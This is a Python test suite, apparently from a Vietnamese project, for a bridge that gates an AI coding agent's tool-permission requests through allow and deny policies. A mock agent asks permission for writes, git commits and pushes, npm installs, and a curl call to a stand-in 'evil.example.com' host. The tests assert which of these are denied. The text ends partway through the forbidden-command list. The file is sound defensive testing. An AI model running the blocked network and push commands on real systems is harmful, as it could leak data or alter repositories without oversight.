"""
tests/test_agy_acp_bridge.py
Kiểm thử toàn diện scripts/agy-acp-bridge.py theo yêu cầu brief P5.
Sử dụng tác tử ACP giả (mock Python script) giao tiếp JSON-RPC theo định dạng thực tế.
"""

from __future__ import annotations

import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path
import unittest

ROOT = Path(__file__).resolve().parent.parent
ACP_BRIDGE_PATH = ROOT / "scripts" / "agy-acp-bridge.py"

_spec = importlib.util.spec_from_file_location("agy_acp_bridge", str(ACP_BRIDGE_PATH))
agy_acp_bridge = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(agy_acp_bridge)

MOCK_ACP_SCRIPT = """#!/usr/bin/env python3
import sys
import json
import os
import time

log_file = os.environ.get("MOCK_ACP_LOG")
scenario = os.environ.get("MOCK_ACP_SCENARIO", "success")
mock_session_id = os.environ.get("MOCK_SESSION_ID", "session-fixed-123")

def log(entry):
    if log_file:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry, ensure_ascii=False) + "\\n")

prompt_req_id = None
current_session_id = mock_session_id

if "-p" in sys.argv:
    log({"probe_argv": sys.argv})
    probe_scenario = os.environ.get("MOCK_PROBE_SCENARIO")
    if probe_scenario == "success":
        sys.stdout.write(json.dumps({"status": "SUCCESS", "response": "pong"}) + "\\n")
        sys.exit(0)
    elif probe_scenario == "quota":
        sys.stdout.write(json.dumps({"status": "ERROR", "error": "Resource has been exhausted (quota 429)"}) + "\\n")
        sys.exit(1)
    if scenario in ("quota_error", "quota_probe_quota", "p1i_write_then_error"):
        sys.stdout.write(json.dumps({"status": "ERROR", "error": "Resource has been exhausted (quota 429)"}) + "\\n")
        sys.exit(1)
    else:
        sys.stdout.write(json.dumps({"status": "SUCCESS", "response": "pong"}) + "\\n")
        sys.exit(0)

for line in sys.stdin:
    line = line.strip()
    if not line:
        continue
    try:
        msg = json.loads(line)
    except Exception:
        continue

    log({"received": msg})
    method = msg.get("method")
    req_id = msg.get("id")

    if method == "initialize":
        res = {
            "jsonrpc": "2.0",
            "id": req_id,
            "result": {
                "protocolVersion": 1,
                "agentInfo": {"name": "mock-acp", "version": "1.0"}
            }
        }
        sys.stdout.write(json.dumps(res) + "\\n")
        sys.stdout.flush()

    elif method == "session/new":
        current_session_id = mock_session_id
        res = {
            "jsonrpc": "2.0",
            "id": req_id,
            "result": {"sessionId": current_session_id}
        }
        sys.stdout.write(json.dumps(res) + "\\n")
        sys.stdout.flush()

    elif method == "session/load":
        current_session_id = msg.get("params", {}).get("sessionId", "loaded-session")
        res = {
            "jsonrpc": "2.0",
            "id": req_id,
            "result": {"sessionId": current_session_id}
        }
        sys.stdout.write(json.dumps(res) + "\\n")
        sys.stdout.flush()

    elif method == "session/set_model":
        res = {"jsonrpc": "2.0", "id": req_id, "result": {}}
        sys.stdout.write(json.dumps(res) + "\\n")
        sys.stdout.flush()

    elif method == "session/prompt":
        prompt_req_id = req_id
        prompt_list = msg.get("params", {}).get("prompt", [])
        prompt_text = prompt_list[0].get("text", "") if prompt_list else ""
        is_continuation = ("bị từ chối" in prompt_text and "Lệnh " in prompt_text)

        if is_continuation and scenario not in ("p1h_always_denied", "p1h_autocont_recover"):
            res = {
                "jsonrpc": "2.0",
                "id": prompt_req_id,
                "result": {
                    "stopReason": "end_turn",
                    "usage": {"totalTokens": 1000}
                }
            }
            sys.stdout.write(json.dumps(res) + "\\n")
            sys.stdout.flush()

        elif scenario == "p1h_autocont_recover":
            if not is_continuation:
                perm_req = {
                    "jsonrpc": "2.0",
                    "id": "perm-1",
                    "method": "session/request_permission",
                    "params": {
                        "sessionId": current_session_id,
                        "toolCall": {
                            "name": "run_command",
                            "kind": "execute",
                            "args": {"CommandLine": "python3 -c \\"import os; print(os.listdir('scripts'))\\""}
                        }
                    }
                }
                sys.stdout.write(json.dumps(perm_req) + "\\n")
                sys.stdout.flush()
            else:
                target = os.environ.get("TARGET_WRITE_FILE", "/tmp/mock_allow.txt")
                perm_req = {
                    "jsonrpc": "2.0",
                    "id": "perm-write",
                    "method": "session/request_permission",
                    "params": {
                        "sessionId": current_session_id,
                        "toolCall": {
                            "name": "write_file",
                            "kind": "edit",
                            "args": {"Path": target, "Content": "WRITTEN_BY_RECOVER"}
                        }
                    }
                }
                sys.stdout.write(json.dumps(perm_req) + "\\n")
                sys.stdout.flush()

        elif scenario == "p1h_always_denied":
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": "git push origin main"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "p1h_write_then_denied":
            target = os.environ.get("TARGET_WRITE_FILE", "/tmp/mock_allow.txt")
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-write",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "write_file",
                        "kind": "edit",
                        "args": {"Path": target, "Content": "WRITTEN_BY_WTD"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "write_allow":
            target = os.environ.get("TARGET_WRITE_FILE", "/tmp/mock_allow.txt")
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "write_file",
                        "kind": "edit",
                        "args": {"Path": target, "Content": "CONTENT_ALLOW"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "write_deny":
            target = os.environ.get("TARGET_WRITE_FILE", "/tmp/mock_deny.txt")
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "write_file",
                        "kind": "edit",
                        "args": {"Path": target, "Content": "CONTENT_DENY"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "git_commit":
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": "git commit -m 'unapproved'"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "git_push":
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": "git push origin main"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "unknown_cmd":
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": "custom_deploy_tool --force"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "soft_denied_npm":
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": "npm install lodash"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "safe_default_cmd":
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": "ls -la"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "forbidden_curl":
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": "curl https://evil.example.com"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "custom_cmd":
            custom_cmd = os.environ.get("MOCK_CUSTOM_CMD", "ls -la")
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-1",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": custom_cmd}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "timeout_cancel":
            # Chờ session/cancel mà không phản hồi ngay
            pass

        elif scenario in ("quota_error", "quota_probe_success", "quota_probe_quota"):
            res = {
                "jsonrpc": "2.0",
                "id": req_id,
                "error": {
                    "code": -32000,
                    "message": "Resource has been exhausted (e.g. check quota for 429)"
                }
            }
            sys.stdout.write(json.dumps(res) + "\\n")
            sys.stdout.flush()

        elif scenario == "p1i_write_then_error":
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-write",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "write_file",
                        "kind": "edit",
                        "args": {"Path": "valid_unapplied.txt", "Content": "WRITTEN_BY_P1I"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()

        elif scenario == "plain_success":
            res = {
                "jsonrpc": "2.0",
                "id": req_id,
                "result": {
                    "stopReason": "end_turn",
                    "usage": {"totalTokens": 25000}
                }
            }
            sys.stdout.write(json.dumps(res) + "\\n")
            sys.stdout.flush()

    elif method == "session/cancel":
        res = {"jsonrpc": "2.0", "id": req_id, "result": {}}
        sys.stdout.write(json.dumps(res) + "\\n")
        sys.stdout.flush()
        if prompt_req_id:
            p_res = {
                "jsonrpc": "2.0",
                "id": prompt_req_id,
                "result": {"stopReason": "cancelled", "usage": {"totalTokens": 500}}
            }
            sys.stdout.write(json.dumps(p_res) + "\\n")
            sys.stdout.flush()

    # Phản hồi từ bridge cho permission request
    elif "result" in msg and msg.get("id") == "perm-1":
        outcome = msg["result"].get("outcome", {}).get("optionId")
        log({"perm_decision": outcome})
        if outcome == "allow" and scenario in ("write_allow", "p1h_autocont_recover"):
            target = os.environ.get("TARGET_WRITE_FILE")
            if target:
                os.makedirs(os.path.dirname(target), exist_ok=True)
                with open(target, "w", encoding="utf-8") as f:
                    f.write("WRITTEN_BY_MOCK_ALLOW")
        # Kết thúc prompt sau khi nhận trả lời quyền
        res = {
            "jsonrpc": "2.0",
            "id": prompt_req_id,
            "result": {
                "stopReason": "end_turn",
                "usage": {"totalTokens": 15000 if scenario == "p1h_autocont_recover" else 32000}
            }
        }
        sys.stdout.write(json.dumps(res) + "\\n")
        sys.stdout.flush()

    elif "result" in msg and msg.get("id") == "perm-write":
        outcome = msg["result"].get("outcome", {}).get("optionId")
        log({"perm_decision": outcome})
        if outcome == "allow":
            if scenario == "p1i_write_then_error":
                with open("valid_unapplied.txt", "w", encoding="utf-8") as f:
                    f.write("WRITTEN_BY_MOCK_ALLOW")
            else:
                target = os.environ.get("TARGET_WRITE_FILE")
                if target:
                    os.makedirs(os.path.dirname(target), exist_ok=True)
                    with open(target, "w", encoding="utf-8") as f:
                        f.write("WRITTEN_BY_MOCK_ALLOW")
        if scenario == "p1h_write_then_denied":
            # Trong CÙNG lượt, xin tiếp một lệnh cấm để bị từ chối
            perm_req = {
                "jsonrpc": "2.0",
                "id": "perm-2",
                "method": "session/request_permission",
                "params": {
                    "sessionId": current_session_id,
                    "toolCall": {
                        "name": "run_command",
                        "kind": "execute",
                        "args": {"CommandLine": "git push origin main"}
                    }
                }
            }
            sys.stdout.write(json.dumps(perm_req) + "\\n")
            sys.stdout.flush()
        elif scenario == "p1i_write_then_error":
            res = {
                "jsonrpc": "2.0",
                "id": prompt_req_id,
                "error": {
                    "code": -32000,
                    "message": "Resource has been exhausted (quota limit reached)"
                }
            }
            sys.stdout.write(json.dumps(res) + "\\n")
            sys.stdout.flush()
        else:
            res = {
                "jsonrpc": "2.0",
                "id": prompt_req_id,
                "result": {
                    "stopReason": "end_turn",
                    "usage": {"totalTokens": 10000}
                }
            }
            sys.stdout.write(json.dumps(res) + "\\n")
            sys.stdout.flush()

    elif "result" in msg and msg.get("id") == "perm-2":
        outcome = msg["result"].get("outcome", {}).get("optionId")
        log({"perm_decision": outcome})
        res = {
            "jsonrpc": "2.0",
            "id": prompt_req_id,
            "result": {
                "stopReason": "end_turn",
                "usage": {"totalTokens": 20000}
            }
        }
        sys.stdout.write(json.dumps(res) + "\\n")
        sys.stdout.flush()
"""


class TestAgyAcpBridge(unittest.TestCase):
    def setUp(self):
        self.tmp_dir = tempfile.TemporaryDirectory()
        self.base_dir = Path(self.tmp_dir.name).resolve()

        # Thư mục repo độc lập
        self.repo_dir = self.base_dir / "repo"
        self.repo_dir.mkdir()

        subprocess.run(["git", "init"], cwd=self.repo_dir, capture_output=True, check=True)
        subprocess.run(["git", "config", "user.name", "TestUser"], cwd=self.repo_dir, check=True)
        subprocess.run(["git", "config", "user.email", "test@example.com"], cwd=self.repo_dir, check=True)

        readme = self.repo_dir / "README.md"
        readme.write_text("# Test Repo\n", encoding="utf-8")
        subprocess.run(["git", "add", "README.md"], cwd=self.repo_dir, check=True)
        subprocess.run(["git", "commit", "-m", "Initial commit"], cwd=self.repo_dir, check=True)

        # File mock và log nằm ngoài repo
        self.mock_bin = self.base_dir / "mock_agy.py"
        self.mock_bin.write_text(MOCK_ACP_SCRIPT, encoding="utf-8")
        self.mock_bin.chmod(0o755)

        self.task_file = self.base_dir / "brief.md"
        self.task_file.write_text("Nhiệm vụ kiểm thử ACP\n", encoding="utf-8")

        self.mock_log = self.base_dir / "mock.log"
        self.report_dir = self.base_dir / "reports"

        self.env = os.environ.copy()
        self.env["AGY_BIN"] = str(self.mock_bin)
        self.env["MOCK_ACP_LOG"] = str(self.mock_log)

    def tearDown(self):
        self.tmp_dir.cleanup()

    def _read_mock_log(self) -> list[dict]:
        if not self.mock_log.exists():
            return []
        entries = []
        for line in self.mock_log.read_text(encoding="utf-8").splitlines():
            if line.strip():
                try:
                    entries.append(json.loads(line))
                except Exception:
                    pass
        return entries

    def test_write_file_allow(self):
        """Ghi file trong phạm vi được allow -> cho phép và tạo file."""
        target_file = self.repo_dir / "allowed_file.txt"
        self.env["MOCK_ACP_SCENARIO"] = "write_allow"
        self.env["TARGET_WRITE_FILE"] = str(target_file)

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--allow-write", str(target_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])
        self.assertIn("1 changed", lines[1])
        self.assertTrue(target_file.exists())
        self.assertEqual(target_file.read_text(), "WRITTEN_BY_MOCK_ALLOW")

    def test_write_file_deny_outside_allow_write(self):
        """Ghi file ngoài phạm vi bị deny."""
        target_file = self.repo_dir / "unallowed_file.txt"
        self.env["MOCK_ACP_SCENARIO"] = "write_deny"
        self.env["TARGET_WRITE_FILE"] = str(target_file)

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--allow-write", str(self.repo_dir / "other_file.txt"),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=1", lines[0])
        self.assertFalse(target_file.exists())

        # Kiểm tra log xem outcome có đúng là deny không
        log_entries = self._read_mock_log()
        perm_decisions = [e.get("perm_decision") for e in log_entries if "perm_decision" in e]
        self.assertEqual(perm_decisions, ["deny"])

    def test_git_commit_allowed(self):
        """P6f: Lệnh git commit cục bộ được tự động cho phép."""
        self.env["MOCK_ACP_SCENARIO"] = "git_commit"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])

        log_entries = self._read_mock_log()
        perm_decisions = [e.get("perm_decision") for e in log_entries if "perm_decision" in e]
        self.assertEqual(perm_decisions, ["allow"])

    def test_git_push_deny(self):
        """P6f: Lệnh git push bị từ chối tuyệt đối ở mọi chế độ."""
        self.env["MOCK_ACP_SCENARIO"] = "git_push"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines[0])

        log_entries = self._read_mock_log()
        perm_decisions = [e.get("perm_decision") for e in log_entries if "perm_decision" in e]
        self.assertEqual(perm_decisions, ["deny"])

    def test_unknown_command_deny_needs_human_warn(self):
        """P6f: Lệnh lạ được cho phép mặc định; lệnh soft-deny (npm install) bị từ chối nếu thiếu --allow-cmd."""
        # 1. Lệnh lạ (custom_deploy_tool --force) được phép mặc định theo triết lý P6f
        self.env["MOCK_ACP_SCENARIO"] = "unknown_cmd"
        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]
        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )
        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])

        # 2. Lệnh soft-deny (npm install) bị từ chối khi không có --allow-cmd
        self.env["MOCK_ACP_SCENARIO"] = "soft_denied_npm"
        proc2 = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )
        self.assertEqual(proc2.returncode, 0, f"Stderr: {proc2.stderr}\nStdout: {proc2.stdout}")
        lines2 = proc2.stdout.strip().splitlines()
        self.assertTrue(lines2[0].startswith("STATUS: warn session="))
        self.assertIn("denied=1", lines2[0])

    def test_safe_default_command_allow(self):
        """Lệnh an toàn mặc định (ls -la) được tự động cho phép."""
        self.env["MOCK_ACP_SCENARIO"] = "safe_default_cmd"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: ok session="))
        self.assertIn("denied=0", lines[0])

        log_entries = self._read_mock_log()
        perm_decisions = [e.get("perm_decision") for e in log_entries if "perm_decision" in e]
        self.assertEqual(perm_decisions, ["allow"])

    def test_two_turns_via_session_load(self):
        """Hai lượt qua --session (dùng session/load) nhớ lại session_id."""
        self.env["MOCK_ACP_SCENARIO"] = "plain_success"
        self.env["MOCK_SESSION_ID"] = "session-test-multi-turn-888"

        # Lượt 1: tạo session mới
        argv1 = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]
        proc1 = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv1,
            env=self.env,
            capture_output=True,
            text=True,
        )
        self.assertEqual(proc1.returncode, 0, f"Stderr: {proc1.stderr}\nStdout: {proc1.stdout}")
        lines1 = proc1.stdout.strip().splitlines()
        self.assertIn("session=session-test-multi-turn-888", lines1[0])

        # Lượt 2: tiếp tục bằng --session
        task2 = self.base_dir / "task2.md"
        task2.write_text("Tin nhắn tiếp theo\n", encoding="utf-8")
        argv2 = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(task2),
            "--session", "session-test-multi-turn-888",
            "--report-dir", str(self.report_dir),
        ]
        proc2 = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv2,
            env=self.env,
            capture_output=True,
            text=True,
        )
        self.assertEqual(proc2.returncode, 0, f"Stderr: {proc2.stderr}\nStdout: {proc2.stdout}")
        lines2 = proc2.stdout.strip().splitlines()
        self.assertIn("session=session-test-multi-turn-888", lines2[0])

        # Xác minh mock nhận được method session/load với đúng sessionId
        log_entries = self._read_mock_log()
        load_calls = [
            e["received"] for e in log_entries
            if "received" in e and e["received"].get("method") == "session/load"
        ]
        self.assertEqual(len(load_calls), 1)
        self.assertEqual(
            load_calls[0].get("params", {}).get("sessionId"),
            "session-test-multi-turn-888"
        )

    def test_timeout_sends_cancel(self):
        """Hết timeout gửi session/cancel và thoát mã 2 fail."""
        self.env["MOCK_ACP_SCENARIO"] = "timeout_cancel"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--timeout", "1.0",
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 2, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: fail session="))

        log_entries = self._read_mock_log()
        cancel_calls = [
            e["received"] for e in log_entries
            if "received" in e and e["received"].get("method") == "session/cancel"
        ]
        self.assertEqual(len(cancel_calls), 1)

    def test_quota_error_exit_code_7(self):
        """Lỗi quota thoát mã 7 và in STATUS: quota ... DOI-TAI-KHOAN-AGY."""
        self.env["MOCK_ACP_SCENARIO"] = "quota_error"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 7, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: quota session="))
        self.assertIn("DOI-TAI-KHOAN-AGY", lines[0])

    def test_stdout_exact_three_lines(self):
        """Stdout luôn in đúng 3 dòng định dạng chuẩn."""
        self.env["MOCK_ACP_SCENARIO"] = "plain_success"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 3)
        self.assertTrue(lines[0].startswith("STATUS: "))
        self.assertTrue(lines[1].startswith("FILES: "))
        self.assertTrue(lines[2].startswith("REPORT: "))

    def test_dry_run_does_not_run_agy(self):
        """--dry-run không khởi chạy agy, in JSON trên 1 dòng."""
        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--allow-write", "test.txt",
            "--allow-cmd", "python3.*",
            "--dry-run",
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertEqual(len(lines), 1)

        plan = json.loads(lines[0])
        self.assertEqual(plan["argv"], [str(self.mock_bin), "acp", "--sandbox"])
        self.assertEqual(plan["policy"]["allow_write"], ["test.txt"])
        self.assertEqual(plan["policy"]["allow_cmd"], ["python3.*"])

        # Không hề có log từ mock ACP
        self.assertEqual(len(self._read_mock_log()), 0)

    def test_forbidden_command_never_allowed_even_with_allow_cmd(self):
        """Lệnh cấm không bao giờ được allow dù người dùng truyền --allow-cmd khớp."""
        self.env["MOCK_ACP_SCENARIO"] = "forbidden_curl"

        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--allow-cmd", "curl.*", ".*",  # Cố tình cho phép regex rộng
            "--report-dir", str(self.report_dir),
        ]

        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )

        self.assertEqual(proc.returncode, 0, f"Stderr: {proc.stderr}\nStdout: {proc.stdout}")
        lines = proc.stdout.strip().splitlines()
        self.assertIn("denied=1", lines[0])

        log_entries = self._read_mock_log()
        perm_decisions = [e.get("perm_decision") for e in log_entries if "perm_decision" in e]
        self.assertEqual(perm_decisions, ["deny"])

    def _run_acp_custom_cmd(self, cmd: str, allow_cmd: list[str] | None = None) -> tuple[subprocess.CompletedProcess, list[str]]:
        self.mock_log.unlink(missing_ok=True)
        self.env["MOCK_ACP_SCENARIO"] = "custom_cmd"
        self.env["MOCK_CUSTOM_CMD"] = cmd
        argv = [
            "run",
            "--dir", str(self.repo_dir),
            "--task-file", str(self.task_file),
            "--report-dir", str(self.report_dir),
        ]
        if allow_cmd:
            for ac in allow_cmd:
                argv.extend(["--allow-cmd", ac])
        proc = subprocess.run(
            [sys.executable, str(ACP_BRIDGE_PATH)] + argv,
            env=self.env,
            capture_output=True,
            text=True,
        )
        log_entries = self._read_mock_log()
        perm_decisions = [e.get("perm_decision") for e in log_entries if "perm_decision" in e]
        return proc, perm_decisions

    def test_p1f_safe_default_commands_unit(self):
        """Kiểm tra từng lệnh an toàn mặc định mới theo brief P6d (thu hẹp danh sách cho phép)."""
        safe_cmds = [
            # Git chỉ đọc (8 lệnh con được phép theo P6d)
            "git status",
            "git status --short",
            "git diff",
            "git diff --stat",
            "git log",
            "git log -n 5",
            "git show",
            "git show HEAD",
            "git rev-parse HEAD",
            "git ls-files scripts/",
            "git blame scripts/agy-bridge.py",
            "git merge-base HEAD HEAD",
            # Đọc / kiểm tra
            "ls",
            "ls -la",
            "cat README.md",
            "head -n 10 README.md",
            "tail -n 10 README.md",
            "wc -l README.md",
            "pwd",
            "echo hi",
            "echo 'hello world'",
            "true",
            "rg foo README.md",
            # Python script trong scripts/
            "python3 scripts/task-gate.py",
            # Ghép lệnh an toàn với | hoặc ; hoặc 2>&1
            "ls docs | wc -l",
            "git status --short ; git diff --stat",
            "git status >/dev/null 2>&1",
        ]
        for cmd in safe_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Lệnh phải được cho phép nhưng bị từ chối: {cmd} (lý do: {reason})")
            self.assertFalse(needs_human, f"Lệnh an toàn không được gắn needs_human: {cmd}")

        # P6f: Toàn bộ các lệnh đọc/phân tích/xây dựng được khôi phục cho phép mặc định
        restored_cmds = [
            "sed -n 1,5p README.md",
            "sort README.md",
            "tree",
            "tree docs",
            "uniq README.md",
            "mkdir my_folder",
            "mkdir -p my_folder/sub_folder",
            "python3 -m unittest tests.test_agy_acp_bridge -q",
            "python -m unittest -q",
            "python3 -m py_compile scripts/agy-acp-bridge.py",
            "python3 -m json.tool data.json",
            "git remote -v",
            "git branch",
            "git branch -a",
            "git branch -r",
            "git branch --list",
            "git branch -v",
            "git stash list",
            "git stash list --stat",
            "git ls-tree HEAD",
            "git describe --tags",
            "file README.md",
            "stat README.md",
            "which python3",
            "date",
            "diff README.md README.md",
            "cmp README.md README.md",
            "git status --short && git diff --stat",
            "ls | sort | uniq",
        ]
        for cmd in restored_cmds:
            allowed, needs_human, reason = agy_acp_bridge.check_command_permission(
                cmd_str=cmd,
                allow_cmd=None,
                effective_dir=self.repo_dir,
            )
            self.assertTrue(allowed, f"Lệnh trong allowlist P6f phải được cho phép: {cmd} (lý do: {reason})")
            self.assertFalse(needs_human)

    def test_p1f_forbidden_commands_unit(self):
        """Kiểm tra danh sách lệnh cấm tuyệt đối theo brief P6f."""
        forbidden_cmds = [
